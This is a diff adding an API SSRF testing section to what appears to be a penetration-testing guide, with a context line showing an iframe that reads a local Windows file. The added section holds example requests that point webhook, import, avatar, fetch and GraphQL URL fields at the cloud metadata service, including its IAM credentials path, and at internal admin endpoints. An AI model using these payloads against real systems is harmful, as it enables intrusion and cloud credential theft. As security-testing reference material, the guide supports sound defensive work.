@@ -71,6 +71,77 @@ In some cases, a server may convert uploaded files to PDF format. Try injecting 
 <iframe src="file:///c:/windows/win.ini" width="400" height="400">
 ```
 
+### API-Specific SSRF Testing
+
+APIs are particularly susceptible to SSRF vulnerabilities, especially in features that process URLs or fetch external resources:
+
+#### Webhook URL Injection
+
+Many APIs allow users to configure webhook URLs for notifications:
+
+```http
+POST /api/v1/integrations/webhook HTTP/1.1
+Content-Type: application/json
+
+{
+  "webhook_url": "http://169.254.169.254/latest/meta-data/",
+  "events": ["order.created"]
+}
+```
+
+#### URL Parameters in JSON Bodies
+
+API endpoints that accept URLs in request bodies:
+
+```http
+POST /api/v1/import HTTP/1.1
+Content-Type: application/json
+
+{
+  "source_url": "http://internal-service.local/admin",
+  "format": "csv"
+}
+```
+
+#### Image/Avatar Fetching
+
+Profile picture or image import features:
+
+```http
+PUT /api/v1/users/profile HTTP/1.1
+Content-Type: application/json
+
+{
+  "avatar_url": "http://localhost:8080/admin/users"
+}
+```
+
+#### Cloud Metadata Exfiltration
+
+For APIs running in cloud environments, test for access to metadata services:
+
+```http
+POST /api/v1/fetch HTTP/1.1
+Content-Type: application/json
+
+{
+  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+}
+```
+
+#### GraphQL SSRF
+
+GraphQL mutations that accept URL inputs:
+
+```graphql
+mutation {
+  importData(sourceUrl: "http://internal-db:5432/") {
+    success
+    importedRecords
+  }
+}
+```
+
 ### Common Filter Bypass
 
 Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:
